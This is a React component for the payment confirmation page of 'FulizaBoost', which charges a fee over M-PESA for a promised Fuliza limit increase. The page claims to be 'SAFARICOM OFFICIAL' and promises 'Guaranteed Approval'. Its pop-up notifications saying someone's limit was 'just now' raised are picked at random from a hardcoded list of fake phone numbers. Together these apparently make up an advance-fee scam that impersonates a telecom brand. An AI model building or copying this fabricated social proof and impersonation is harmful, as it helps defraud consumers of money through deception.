import { useLocation, useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";
import "../styles/Confirmation.css";

const Confirmation = () => {
  const navigate = useNavigate();
  const { state } = useLocation();
  const { limit, fee, phone,username } = state || {};

  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<string | null>(null);
 

  const handlePay = async () => {
    if (!phone || !fee) {
      setMessage("Phone number or fee is missing!");
      return;
    }

    setLoading(true);
    setMessage(null);

    try {
      const response = await fetch("https://fulizaboost-f4ry.onrender.com/api/boosts/pay", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          fee,
          customer_name:username 
        }),
      });

      const data = await response.json();
      setLoading(false);

      if (data.success) {
        setMessage("Payment queued! Check your phone for MPESA prompt.");
        // Optionally navigate after a delay
        setTimeout(() => navigate("/success"), 2000);
      } else {
        setMessage("Payment failed: " + (data.message || "Try again"));
      }
    } catch (err: any) {
      console.error(err);
      setLoading(false);
      setMessage("Error: " + err.message);
    }
  };

   const notifications = [
  { phone: "0708****85", limit: 45000 },
  { phone: "0712****34", limit: 30000 },
  { phone: "0722****91", limit: 25000 },
  { phone: "0733****56", limit: 35000 },
  { phone: "0745****23", limit: 20000 },
  { phone: "0756****78", limit: 15000 },
  { phone: "0767****12", limit: 40000 },
  { phone: "0778****45", limit: 25000 },
  { phone: "0789****67", limit: 30000 },
  { phone: "0791****89", limit: 45000 },
];

 const [currentNotification, setCurrentNotification] = useState(notifications[0]);
  const [showNotification, setShowNotification] = useState(true);

  // Change notification every 4 seconds
    useEffect(() => {
      const interval = setInterval(() => {
        setShowNotification(false);
        
        setTimeout(() => {
          const randomIndex = Math.floor(Math.random() * notifications.length);
          setCurrentNotification(notifications[randomIndex]);
          setShowNotification(true);
        }, 300);
      }, 4000);
  
      return () => clearInterval(interval);
    }, []);

  return (
    <main className="cf-container">
      {/* HEADER */}
      <div className="cf-header">
        <button className="back-btn" onClick={() => navigate(-1)}>←</button>
        <span className="header-title">Confirmation</span>
      </div>

      {/* BRAND */}
      <div className="cf-brand">
        <div className="badge">● SAFARICOM OFFICIAL</div>
        <h1 className="title">FulizaBoost</h1>
        <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
      </div>

        {/* NOTIFICATION OVERLAY */}
      <div className={`notification-overlay ${showNotification ? 'show' : ''}`}>
        <div className="notification-icon"></div>
        <div className="notification-content">
          <strong>{currentNotification.phone}</strong> increased to Ksh {currentNotification.limit.toLocaleString()}
          <div className="notification-time">• just now</div>
        </div>
      </div>

      

      <hr />

      <h2 className="review-title">Review Request</h2>
      <p className="review-text">Please confirm your selection before we initiate the STK push.</p>

      {/* SUMMARY CARD */}
      <div className="summary-card">
        <div className="row">
          <span>New Limit</span>
          <strong className="green">Ksh {limit?.toLocaleString()}</strong>
        </div>
        <div className="row">
          <span>Processing Fee</span>
          <strong>Ksh {fee}</strong>
        </div>
        <hr />
        <div className="payment">
          <span className="label">PAYMENT PHONE</span>
          <p className="phone"><span className="dot" /> {phone}</p>
        </div>
      </div>

      {/* FOOTER */}
      <div className="cf-footer">
        <button className="pay-btn" onClick={handlePay} disabled={loading}>
          {loading ? "Processing..." : `Pay Ksh ${fee} & Boost`}
        </button>
        <button className="cancel-btn" onClick={() => navigate("/")}>Cancel Request</button>
        {message && <p className="info-text">{message}</p>}
      </div>

      {/* STK PUSH LOADER */}
{loading && (
  <div className="stk-loader">
    <div className="stk-spinner"></div>
    <p>Initiating M-PESA STK Push…</p>
    <span>Please check your phone</span>
  </div>
)}
    </main>
  );
};

export default Confirmation;
